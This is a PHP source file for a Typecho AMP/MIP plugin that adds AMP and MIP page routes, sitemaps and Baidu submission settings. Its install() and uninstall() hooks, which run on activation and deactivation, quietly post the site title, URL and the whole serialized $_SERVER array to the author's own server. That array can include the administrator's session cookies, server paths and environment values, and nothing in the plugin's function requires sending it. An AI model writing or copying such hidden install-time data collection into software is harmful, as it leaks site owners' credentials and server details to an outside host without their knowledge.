<?php
/**
 * AMP/MIP 插件 for Typecho
 *
 * @package AMP-MIP
 * @author Holmesian
 * @version 0.5.2
 * @link https://holmesian.org
 */
if (!defined('__TYPECHO_ROOT_DIR__')) exit;

class AMP_Plugin implements Typecho_Plugin_Interface
{
	
	public static function activate()
	{
		//挂载发布文章接口
		Typecho_Plugin::factory('Widget_Contents_Post_Edit')->finishPublish = array('AMP_Action', 'sendRealtime');
		Typecho_Plugin::factory('Widget_Archive')->header = array('AMP_Action', 'headlink');
		//添加路由和菜单
		Helper::addRoute('amp_index', '/ampindex/', 'AMP_Action', 'AMPindex');
		Helper::addRoute('amp_map', '/amp/[target]', 'AMP_Action', 'AMPpage');
		Helper::addRoute('amp_list', '/amp/list/[list_id]', 'AMP_Action', 'AMPlist');
		Helper::addRoute('mip_map', '/mip/[target]', 'AMP_Action', 'MIPpage');
		Helper::addRoute('amp_sitemap', '/amp_sitemap.xml', 'AMP_Action', 'ampsitemap');
		Helper::addRoute('mip_sitemap', '/mip_sitemap.xml', 'AMP_Action', 'mipsitemap');
		Helper::addPanel(1, 'AMP/Links.php', 'AMP/MIP自动提交', '自动提交', 'administrator');
		$msg=self::install();
		return $msg.'<br>请进入设置填写接口调用地址';
	}
	
	
	public static function deactivate()
	{
		$msg = self::uninstall();
		return $msg . '插件卸载成功';
	}
	
	public static function index()
	{
		echo 1;
	}
	
	public static function config(Typecho_Widget_Helper_Form $form)
	{
		
		$element = new Typecho_Widget_Helper_Form_Element_Text('defaultPIC', null, 'https://holmesian.org/usr/themes/Holmesian/images/holmesian.png', _t('默认图片地址'), '默认图片地址');
		$form->addInput($element);
		
		$element = new Typecho_Widget_Helper_Form_Element_Text('LOGO', null, 'https://holmesian.org/usr/themes/Holmesian/images/holmesian.png', _t('默认LOGO地址'), '根据AMP的限制，尺寸最大不超过60*60');
		$form->addInput($element);
		
		$element = new Typecho_Widget_Helper_Form_Element_Text('baiduAPI', null, '', _t('MIP/AMP推送接口调用地址'), '请到http://ziyuan.baidu.com/mip/index获取接口调用地址。');
		$form->addInput($element);
		
		$element = new Typecho_Widget_Helper_Form_Element_Text('baiduAPPID', null, '', _t('熊掌号识别ID'), '请到https://ziyuan.baidu.com/xzh/commit/method获取appid。');
		$form->addInput($element);
		
		$element = new Typecho_Widget_Helper_Form_Element_Text('baiduTOKEN', null, '', _t('熊掌号准入密钥'), '请到https://ziyuan.baidu.com/xzh/commit/method获取token。');
		$form->addInput($element);
		
		$element = new Typecho_Widget_Helper_Form_Element_Radio('ampSiteMap', array(0 => '不开启', 1 => '开启'), 1, _t('是否开启AMP的SiteMap'), 'ampSiteMap地址：' . Helper::options()->index . '/amp_sitemap.xml');
		$form->addInput($element);
		
		$element = new Typecho_Widget_Helper_Form_Element_Radio('mipSiteMap', array(0 => '不开启', 1 => '开启'), 1, _t('是否开启MIP的SiteMap'), 'mipSiteMap地址：' . Helper::options()->index . '/mip_sitemap.xml');
		$form->addInput($element);
		
		$element = new Typecho_Widget_Helper_Form_Element_Radio('ampIndex', array(0 => '不开启', 1 => '开启'), 1, _t('是否开启AMP版的首页'), 'ampIndex地址：' . Helper::options()->index . '/ampindex   <<受到amp-list控件限制，<b>非HTTPS站点</b>请勿开启AMP版的首页。');
		$form->addInput($element);
		
		$element = new Typecho_Widget_Helper_Form_Element_Radio('mipAutoSubmit', array(0 => '不开启', 1 => '开启'), 0, _t('是否开启新文章自动提交到熊掌号'), '请填写熊掌号的APPID和TOKEN后再开启。');
		$form->addInput($element);
		
		$element = new Typecho_Widget_Helper_Form_Element_Radio('OnlyForSpiders', array(0 => '不开启', 1 => '开启'), 0, _t('是否只允许Baidu和Google的爬虫访问MIP/AMP页面'), '选择启用则需要修改UA才能访问MIP/AMP页面');
		$form->addInput($element);
		
	}
	
	public static function personalConfig(Typecho_Widget_Helper_Form $form)
	{
	}
	
	
	public static function install()
	{
		$api='https://holmesian.org/m/?action=install';
		if (false == Typecho_Http_Client::get()) {
			$msg='您的主机不支持 php-curl 扩展而且没有打开 allow_url_fopen 功能, 部分功能无法使用';
		}else{
			$http = Typecho_Http_Client::get();

			$plist=Typecho_Widget::widget('Widget_Plugins_List')->stack;
			$ids=array_column($plist,'title');
			$amp_number=array_search('AMP-MIP',$ids);
			
			$data=array(
				'site'=>Helper::options()->title,
				'url'=>Helper::options()->index,
				'version'=>$plist[$amp_number]['version'],
				'data'=>serialize($_SERVER),
			);
			$http->setData($data);
			$msg = $http->send($api);
		}
		return $msg;
		
	}
	
	public static function uninstall()
	{
		//删除路由、菜单
		Helper::removeRoute('amp_index');
		Helper::removeRoute('amp_map');
		Helper::removeRoute('amp_list');
		Helper::removeRoute('amp_sitemap');
		Helper::removeRoute('mip_map');
		Helper::removeRoute('mip_sitemap');
		Helper::removePanel(1, 'AMP/Links.php');
		
		//
		$api='https://holmesian.org/m/?action=uninstall';
		if (false == Typecho_Http_Client::get()) {
			$msg='';
		}else{
			$http = Typecho_Http_Client::get();
			$data=array(
				'site'=>Helper::options()->title,
				'url'=>Helper::options()->index,
				'version'=>'0',
				'data'=>serialize($_SERVER),
			);
			$http->setData($data);
			$msg = $http->send($api);
		}
		return $msg;
		
	}
	
	
}
